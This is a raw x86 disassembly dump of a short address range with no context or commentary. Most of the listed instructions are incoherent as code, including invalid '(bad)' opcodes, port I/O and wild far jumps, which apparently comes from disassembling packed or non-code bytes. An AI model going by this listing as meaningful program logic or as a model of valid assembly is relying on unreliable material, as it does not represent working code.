  40def7:	aaa    
  40def8:	addr16 clc 
  40defa:	xor    al,0xb4
  40defc:	adc    ah,BYTE PTR [ebx]
  40defe:	int3   
  40deff:	pop    edx
  40df00:	mov    ebx,0x7346ef12
  40df05:	add    ebp,DWORD PTR [eax]
  40df07:	mov    esp,0x700b641f
  40df0c:	(bad)  
  40df0d:	icebp  
  40df0e:	jle    0x40df0b
  40df10:	lea    ecx,[edx]
  40df12:	jb     0x40df89
  40df14:	sar    BYTE PTR [ebx+0x67ef3043],0xc4
  40df1b:	push   ecx
  40df1c:	inc    esi
  40df1d:	js     0x40df90
  40df1f:	ds add eax,0x9529f77e
  40df25:	jbe    0x40df24
  40df27:	mov    bl,0x17
  40df29:	jbe    0x40df90
  40df2b:	mov    ds:0x3c50c7b6,al
  40df30:	cmc    
  40df31:	xchg   BYTE PTR [edx],bl
  40df33:	dec    esi
  40df34:	pop    esi
  40df35:	ds inc ecx
  40df37:	imul   esi,DWORD PTR [ecx+0x5e],0x2d156fc5
  40df3e:	pop    esp
  40df3f:	mov    eax,0x42080f9d
  40df44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df45:	out    0xcf,eax
  40df47:	imul   ebp,DWORD PTR [edx+0x32],0x1a
  40df4b:	jl     0x40dfc6
  40df4d:	stos   DWORD PTR es:[edi],eax
  40df4e:	mov    ebx,0xddfd33d8
  40df53:	outs   dx,BYTE PTR ds:[esi]
  40df54:	mov    bl,0xd9
  40df56:	loope  0x40df03
  40df58:	pop    ebp
  40df59:	sub    esp,DWORD PTR [esi+eax*8]
  40df5c:	fisubr WORD PTR [esi]
  40df5e:	retf   0xd785
  40df61:	and    eax,0xb8d033a3
  40df66:	aaa    
  40df67:	test   eax,0xbcd9b585
  40df6c:	mov    dl,0xa8
  40df6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df6f:	push   0x2
  40df71:	jbe    0x40df54
  40df73:	xor    eax,0x2b4ce932
  40df78:	fld    DWORD PTR [edi+0x458b49cb]
  40df7e:	in     al,0xf
  40df80:	scas   eax,DWORD PTR es:[edi]
  40df81:	rol    DWORD PTR [ebx],0xe0
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	shr    DWORD PTR [ecx-0x78539a9f],1
  40dfac:	xchg   DWORD PTR [esi+0x7e],edi
  40dfaf:	aas    
  40dfb0:	jg     0x40e030
  40dfb2:	jle    0x40dfa3
  40dfb4:	sub    cl,BYTE PTR [ebx+eax*2+0x1f8a2e8d]
  40dfbb:	xchg   edi,eax
  40dfbc:	push   ebx
  40dfbd:	or     ch,BYTE PTR [esi]
  40dfbf:	ret    0x9456
  40dfc2:	cwde   
  40dfc3:	adc    eax,0xea76fd0d
  40dfc8:	in     eax,dx
  40dfc9:	clc    
  40dfca:	dec    eax
  40dfcb:	xchg   DWORD PTR [eax],eax
  40dfcd:	pop    edx
  40dfcf:	cmp    BYTE PTR [edi+0x1a],0x59
  40dfd3:	mov    al,ds:0xd9653f7d
  40dfd8:	mov    dh,0x5
  40dfda:	jnp    0x40e021
  40dfdc:	mov    edi,0x9acdf83f
  40dfe1:	xchg   edx,eax
  40dfe2:	xchg   ebx,eax
  40dfe3:	dec    esi
  40dfe4:	pop    edx
  40dfe5:	jge    0x40dffc
  40dfe7:	inc    ecx
  40dfe8:	je     0x40dfd9
  40dfea:	dec    edx
  40dfeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfec:	mov    eax,0xcb830fa3
  40dff1:	cmp    eax,0x5ea9b712
  40dff6:	cmp    dl,bh
  40dff8:	mov    bl,0xc8
  40dffa:	packsswb mm5,QWORD PTR [ebp+0x55d109f9]
  40e001:	ficom  WORD PTR [ecx+0x124cd586]
  40e007:	cmc    
  40e008:	xchg   BYTE PTR [ebx],bl
  40e00a:	shr    BYTE PTR [eax],0x6a
  40e00d:	push   ebx
  40e00e:	dec    esi
  40e00f:	enter  0xb2d6,0xe1
  40e013:	outs   dx,BYTE PTR ds:[esi]
  40e014:	and    ah,al
  40e016:	mov    ebp,0xb0d179fc
  40e01b:	dec    ebx
  40e01c:	neg    BYTE PTR [edx+0x3ece170c]
  40e022:	sub    ebp,eax
  40e024:	or     al,0x1d
  40e026:	icebp  
  40e027:	(bad)  
  40e028:	iret   
  40e029:	jae    0x40e00f
  40e02b:	mov    ds:0x97fde3b,eax
  40e030:	stos   DWORD PTR es:[edi],eax
  40e031:	jl     0x40e014
  40e033:	jmp    0x40dfe2
  40e035:	mov    ebx,0x672958cd
  40e03a:	call   0xa236:0xdc7a379f
  40e041:	push   ebx
  40e042:	cmp    BYTE PTR [esi-0x68],0x97
  40e046:	out    0x33,al
  40e048:	adc    eax,0xb9b05ea5
  40e04d:	jle    0x40e045
  40e04f:	fcom   DWORD PTR [ecx+ecx*8-0x7905f534]
  40e056:	jp     0x40e0a1
  40e058:	sti    
  40e059:	xor    dh,BYTE PTR [esi+edi*8-0x57da752e]
  40e060:	add    ebx,DWORD PTR [ecx]
  40e062:	ret    0xc3fe
  40e065:	pop    esi
  40e066:	mov    BYTE PTR [edx-0x1a],ch
  40e069:	xor    eax,0x8687becd
  40e06e:	mov    ebp,0x9f5b41c6
  40e073:	sbb    al,BYTE PTR [ebx-0x49047a60]
  40e079:	imul   edx,DWORD PTR [ebp-0x3c],0x13e08d80
  40e080:	repz ss pop ds
  40e083:	leave  
  40e084:	mov    DWORD PTR [edx-0x43],0xeeb0e854
  40e08b:	sbb    BYTE PTR [esi],ah
  40e08d:	repz ret 0xbcb9
  40e091:	mov    ch,0xc1
  40e093:	hlt    
  40e094:	stc    
  40e095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e096:	push   ebx
  40e097:	mov    ah,0x3
  40e099:	cmc    
  40e09a:	cdq    
  40e09b:	(bad)  
  40e09c:	cmp    al,0x90
  40e09e:	cli    
  40e09f:	push   ss
  40e0a0:	xor    bh,BYTE PTR [ebp-0x6412380f]
  40e0a6:	ret    0xa4cd
  40e0a9:	jbe    0x40e0fa
  40e0ab:	shl    BYTE PTR [ecx+0x8],1
  40e0ae:	sub    DWORD PTR [eax-0x3e],eax
  40e0b1:	xchg   ecx,eax
  40e0b2:	inc    ecx
  40e0b3:	in     eax,dx
  40e0b4:	fcomp  QWORD PTR [edi]
  40e0b6:	aaa    
  40e0b7:	cmp    eax,0x6158328e
  40e0bc:	push   eax
  40e0bd:	or     DWORD PTR [edi],ecx
  40e0bf:	aas    
  40e0c0:	sahf   
  40e0c1:	xor    DWORD PTR [edx+eax*2+0x36fa08a8],ebx
  40e0c8:	mov    al,0xaa
  40e0ca:	or     DWORD PTR [edi+0x62],0x7bb8d57f
  40e0d1:	dec    esi
  40e0d2:	iret   
  40e0d3:	fiadd  DWORD PTR ds:0xc114a35
  40e0d9:	jg     0x40e06d
  40e0db:	jmp    DWORD PTR [esi-0x6a]
  40e0de:	jge    0x40e129
  40e0e0:	dec    edx
  40e0e1:	mov    ch,0x4c
  40e0e3:	icebp  
  40e0e4:	xchg   BYTE PTR [esi+0x58bc00c6],bl
  40e0ea:	nop
  40e0eb:	clc    
  40e0ec:	push   esi
  40e0ed:	sub    BYTE PTR [ebp+0x31],al
  40e0f0:	mov    esi,0x8b1d509b
  40e0f5:	inc    ebp
  40e0f6:	hlt    
  40e0f7:	pop    edi
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
